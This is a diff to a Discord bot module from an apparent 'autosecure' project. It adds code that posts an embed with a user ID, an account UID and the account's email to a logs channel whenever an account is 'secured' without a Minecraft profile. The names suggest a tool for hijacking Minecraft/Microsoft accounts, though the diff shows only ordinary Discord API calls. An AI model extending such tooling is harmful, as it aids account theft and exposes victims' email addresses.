@@ -4,7 +4,7 @@ const { queryParams } = require("../../../db/database.js");
 const fetchStats = require("../../../autosecure/utils/hypixelapi/fetchStats.js");
 const statsembed = require("../../../autosecure/utils/stats/statsembed.js");
 const generateuid = require('../../utils/generateuid.js');
-const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
+const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
 const insertaccount = require('../../../db/insertaccount.js');
 const getStats = require('../../utils/hypixelapi/getStats.js');
 const mcregex = require("../../.././autosecure/utils/utils/mcregex.js")
@@ -77,6 +77,34 @@ module.exports = {
                 const accountmessage = await listAccount(acc, uid, client, interaction);
                 await interaction.editReply(accountmessage);
                 await interaction.user.send(accountmessage);
+
+                // Send embed to logs channel if configured
+                if (settings.logs_channel) {
+                    try {
+                        const [channelId, guildId] = settings.logs_channel.split("|");
+                        const guild = await client.guilds.fetch(guildId);
+                        const channel = await guild.channels.fetch(channelId);
+                        
+                        if (channel) {
+                            const noMcEmbed = new EmbedBuilder()
+                                .setTitle("❌ Account Secured - No Minecraft")
+                                .setColor(0xff6b00)
+                                .addFields(
+                                    { name: "User", value: `<@${interaction.user.id}>` },
+                                    { name: "User ID", value: `${interaction.user.id}` },
+                                    { name: "Account ID", value: acc.uid || "N/A" },
+                                    { name: "Status", value: "No Minecraft Profile Linked" },
+                                    { name: "Email", value: acc.email || "N/A" }
+                                )
+                                .setThumbnail(interaction.user.displayAvatarURL())
+                                .setTimestamp();
+                            
+                            await channel.send({ embeds: [noMcEmbed] });
+                        }
+                    } catch (logsError) {
+                        console.log('[authsecure] Failed to send to logs channel:', logsError.message);
+                    }
+                }
                 return;
             }
 
